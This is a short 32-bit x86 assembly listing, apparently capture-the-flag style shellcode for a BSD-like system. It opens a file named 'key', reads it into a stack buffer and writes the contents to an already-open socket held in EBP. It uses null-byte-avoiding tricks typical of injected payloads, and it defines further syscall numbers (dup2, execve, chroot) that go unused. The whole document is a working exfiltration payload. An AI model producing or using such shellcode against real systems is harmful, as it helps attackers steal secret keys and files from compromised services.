[bits 32]
        %define SYS_dup2                        90
        %define SYS_execve                      59
        %define SYS_chdir                       12
        %define SYS_chroot                      61
        %define SYS_read                         3
        %define SYS_write                        4
        %define SYS_open                         5

        ;; open("key", 0)
        xor eax, eax
        push eax
        push "Xkey"
        mov ebx, esp
        inc ebx
        push eax
        push ebx
        mov al, SYS_open
        push eax
        int 0x80

        ;; allocate 4K
        sub esp, 0x1000         ; buf := ESP

        ;; read(fd, buf, 0x1000)
        mov ebx, esp
        push word 0x1000        ; 3rd
        push ebx                ; 2nd
        push eax                ; 1st
        xor eax, eax
        mov al, SYS_read
        push eax
        int 0x80
        ;; num_read := EAX

        ;; write(sock, buf, num_read)
        push eax
        push ebx
        push ebp
        xor eax, eax
        mov al, SYS_write
        push eax
        int 0x80
